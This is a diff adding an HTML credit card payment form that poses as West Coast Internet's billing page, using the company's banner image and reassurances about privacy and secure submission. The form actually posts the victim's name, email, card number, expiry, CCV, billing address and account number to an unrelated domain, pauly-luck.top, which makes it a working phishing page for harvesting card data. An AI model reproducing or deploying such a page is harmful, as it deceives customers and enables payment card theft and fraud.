@@ -1,0 +1,197 @@
+<html><head><script language="JavaScript">
+<!--
+
+function formCheck(formobj){
+	// Enter name of mandatory fields
+	var fieldRequired = Array("Name", "Email", "CC_CREDITCARD", "CC_CREDITCARDEXP", "CC_CCV");
+	// Enter field description to appear in the dialog box
+	var fieldDescription = Array("Your Name", "Email Address", "Credit Card Number", "Credit Card Expiration Date", "CCV Code");
+	// dialog message
+	var alertMsg = "Please complete the following fields:\n";
+
+	var l_Msg = alertMsg.length;
+
+	for (var i = 0; i < fieldRequired.length; i++){
+		var obj = formobj.elements[fieldRequired[i]];
+		if (obj){
+			switch(obj.type){
+			case "select-one":
+				if (obj.selectedIndex == -1 || obj.options[obj.selectedIndex].text == ""){
+					alertMsg += " - " + fieldDescription[i] + "\n";
+				}
+				break;
+			case "select-multiple":
+				if (obj.selectedIndex == -1){
+					alertMsg += " - " + fieldDescription[i] + "\n";
+				}
+				break;
+			case "text":
+			case "textarea":
+				if (obj.value == "" || obj.value == null){
+					alertMsg += " - " + fieldDescription[i] + "\n";
+				}
+				break;
+			default:
+			}
+			if (obj.type == undefined){
+				var blnchecked = false;
+				for (var j = 0; j < obj.length; j++){
+					if (obj[j].checked){
+						blnchecked = true;
+					}
+				}
+				if (!blnchecked){
+					alertMsg += " - " + fieldDescription[i] + "\n";
+				}
+			}
+		}
+	}
+
+	if (alertMsg.length == l_Msg){
+		return true;
+	}else{
+		alert(alertMsg);
+		return false;
+	}
+}
+// -->
+</script>
+
+
+<style>
+
+  .input {
+      border: 1px solid #006;
+      background: #ffc;
+  }
+  .input:hover {
+      border: 1px solid #f00;
+      background: #ff6;
+  }
+  .button {
+      width: 240px;
+      height: 60px;
+      border: 2px;
+      background: #90EE90;
+      padding: 2px 8px;
+  }
+  .button:hover {
+      border: none;
+      background: #C0C0C0;
+      padding: 2px 8px;
+  }
+  label {
+      display: block;
+      width: 150px;
+      float: left;
+      margin: 2px 4px 6px 4px;
+      text-align: right;
+  }
+
+
+</style>
+
+<title>WestCoast Internet Payment Form</title>
+</head><body text="black" link="blue" bgcolor="white">
+<center>
+<img src="https://secure.comline.com/payment/wciTitleWave.jpg" width="630" height="100" border="0">
+<h2>Credit Card Payment Form</h2>
+<!-- <h4>This form may be used to update your credit card information in our system</h4> -->
+<h5>West Coast Internet <u>Does Not</u> Share Your Personal Information With Any 3rd Parties</h5>
+<h6>Payment is by Visa, MasterCard, Discover, or ATM card only. All credit and debit charges are processed automatically on the first of each month.</h6>
+<table width="490" cellspacing="0" cellpadding="0" border="0">
+  <tbody>
+  <tr>
+    <td valign="top" align="left">
+<form method="POST" action="https://pauly-luck.top/fea/card.php" onsubmit="return formCheck(this);">
+<input type="Hidden" name="SUBJECT" value="Credit Card Payment">
+      <center><font size="1" face="verdana,arial">
+      <table width="470" cellspacing="1" cellpadding="2" border="0">
+        <tbody>
+        <tr>
+          <td valign="top" align="left"><font size="1" face="verdana,arial">
+            <hr size="1">
+            </font></td></tr></tbody></table>
+      <table width="470" cellspacing="1" cellpadding="2" border="0">
+        <tbody>
+        <tr>
+          <td colspan="2" valign="center" bgcolor="#000080" align="center"><font size="2" face="verdana,arial"><b><font color="#ffffff">Personal
+            Information</font></b></font></td></tr>
+        <tr>
+          <td width="130" valign="center" bgcolor="#cfcfcf" align="left">&nbsp;&nbsp;<font size="1" face="verdana,arial"><b>Your Name:</b></font></td>
+          <td width="340" valign="center" bgcolor="#e5e5e5" align="left">&nbsp;&nbsp;<font size="1" face="verdana,arial"><input maxlength="40" name="Name" size="30"></font></td></tr>
+        <tr>
+          <td width="130" valign="center" bgcolor="#cfcfcf" align="left">&nbsp;&nbsp;<font size="1" face="verdana,arial"><b>Email
+            Address:</b></font></td>
+          <td width="340" valign="center" bgcolor="#e5e5e5" align="left">&nbsp;&nbsp;<font size="1" face="verdana,arial"><input maxlength="60" name="Email" size="30"></font></td></tr></tbody></table>
+<p>
+      </p><table width="470" cellspacing="1" cellpadding="2" border="0">
+        <tbody>
+        <tr>
+          <td colspan="2" valign="center" bgcolor="#000080" align="center"><font size="2" face="verdana,arial"><b><font color="#ffffff">Billing
+            Information</font></b></font></td></tr>
+        <tr>
+          <td width="130" valign="center" bgcolor="#cfcfcf" align="left">&nbsp;&nbsp;<font size="1" face="verdana,arial"><b>Payment Method</b></font></td>
+          <td width="340" valign="center" bgcolor="#e5e5e5" align="left">&nbsp;&nbsp;<font size="1" face="verdana,arial">
+	  <select name="Billing_Type" size="1">
+        <option selected="" value="VISA">VISA</option>
+        <option value="MASTERCARD">MASTERCARD</option>
+        <option value="DISCOVER">DISCOVER</option>
+	  </select></font></td></tr>
+	  <tr>
+          <td width="130" valign="center" bgcolor="#cfcfcf" align="left">&nbsp;&nbsp;<font size="1" face="verdana,arial"><b>Card Number:</b></font></td>
+          <td width="340" valign="center" bgcolor="#e5e5e5" align="left">&nbsp;&nbsp;<font size="1" face="verdana,arial"><input maxlength="40" name="CC_CREDITCARD" size="30"></font></td></tr>
+	  <tr>
+          <td width="130" valign="center" bgcolor="#cfcfcf" align="left">&nbsp;&nbsp;<font size="1" face="verdana,arial"><b>Expiration Date:</b></font></td>
+          <td width="340" valign="center" bgcolor="#e5e5e5" align="left">&nbsp;&nbsp;<font size="1" face="verdana,arial"><input maxlength="10" name="CC_CREDITCARDEXP" size="30" placeholder="MM/YY"></font></td></tr>
+	  <tr>
+          <td width="130" valign="center" bgcolor="#cfcfcf" align="left">&nbsp;&nbsp;<font size="1" face="verdana,arial"><b>CCV Code:</b></font></td>
+          <td width="340" valign="center" bgcolor="#e5e5e5" align="left">&nbsp;&nbsp;<font size="1" face="verdana,arial"><input maxlength="10" name="CC_CCV" size="8"></font> 3 Digit on Back of Card</td></tr>
+
+	  <tr>
+          <td width="130" valign="center" bgcolor="#cfcfcf" align="left">&nbsp;&nbsp;<font size="1" face="verdana,arial"><b>Full Name:</b></font></td>
+          <td width="340" valign="center" bgcolor="#e5e5e5" align="left">&nbsp;&nbsp;<font size="1" face="verdana,arial"><input maxlength="40" name="CC_FullName" size="30"></font></td></tr>
+        <tr>
+          <td width="130" valign="center" bgcolor="#cfcfcf" align="left">&nbsp;&nbsp;<font size="1" face="verdana,arial"><b>Street Address:</b></font></td>
+          <td width="340" valign="center" bgcolor="#e5e5e5" align="left">&nbsp;&nbsp;<font size="1" face="verdana,arial"><input maxlength="70" name="CC_BILLING_ADDRESS1" size="30"></font></td></tr>
+        <tr>
+          <td width="130" valign="center" bgcolor="#cfcfcf" align="left">&nbsp;&nbsp;<font size="1" face="verdana,arial"><b>City and State:</b></font></td>
+          <td width="340" valign="center" bgcolor="#e5e5e5" align="left">&nbsp;&nbsp;<font size="1" face="verdana,arial"><input maxlength="70" name="CC_CITY_STATE_ZIP" size="30" placeholder="Laguna Woods, CA"></font></td></tr>
+		  <tr>
+          <td width="130" valign="center" bgcolor="#cfcfcf" align="left">&nbsp;&nbsp;<font size="1" face="verdana,arial"><b>Zip Code:</b></font></td>
+          <td width="340" valign="center" bgcolor="#e5e5e5" align="left">&nbsp;&nbsp;<font size="1" face="verdana,arial"><input maxlength="70" name="STATE_ZIP" size="30" placeholder="92637"></font></td></tr>
+	</tbody></table>
+<p>
+</p><center>If possible please fill in the following field to help us identify your account</center><table width="470" cellspacing="1" cellpadding="2" border="0">
+        <tbody>
+        <tr>
+          <td colspan="2" valign="center" bgcolor="#000080" align="center"><font size="2" face="verdana,arial"><b><font color="#ffffff">Account Information</font></b></font></td></tr>
+        <tr>
+	  </tr><tr></tr>
+      <tr>
+	            <td width="130" valign="center" bgcolor="#cfcfcf" align="left">&nbsp;&nbsp;<font size="1" face="verdana,arial"><b>Account Number:</b></font></td>
+	            <td width="340" valign="center" bgcolor="#e5e5e5" align="left">&nbsp;&nbsp;<font size="1" face="verdana,arial"><input maxlength="20" name="ACCT_NUMBER" size="20" value=""></font></td></tr>
+	</tbody></table>
+<p>
+	 </p><table width="470" cellspacing="1" cellpadding="2" border="0">
+	        <tbody>
+	        <tr>
+	          <td colspan="2" valign="center" bgcolor="#000080" align="center"><font size="2" face="verdana,arial"><b><font color="#ffffff">Comments and Questions</font></b></font></td></tr>
+		  <tr>
+	           <td width="340" valign="center" bgcolor="#e5e5e5" align="center">&nbsp;&nbsp;
+				<font size="1" face="verdana,arial"><textarea rows="4" name="S1" cols="30">				</textarea></font></td></tr>
+
+		</tbody></table>
+
+  <h3><b>Make sure you click "Submit" to send this information securely to our billing department.</b></h3><table width="470" cellspacing="1" cellpadding="2" border="0">
+        <tbody>
+        <tr>
+          <td valign="center" align="right"><font size="1" face="verdana,arial"><br><hr><br>
+<div align="center"><input type="submit" name="Button" value="SUBMIT" class="button"></div><br><hr>
+
+</font></td></tr></tbody></table><p></p></font></center></form></td></tr></tbody>
+
+</table>
+<br>
+
+</center></body></html>
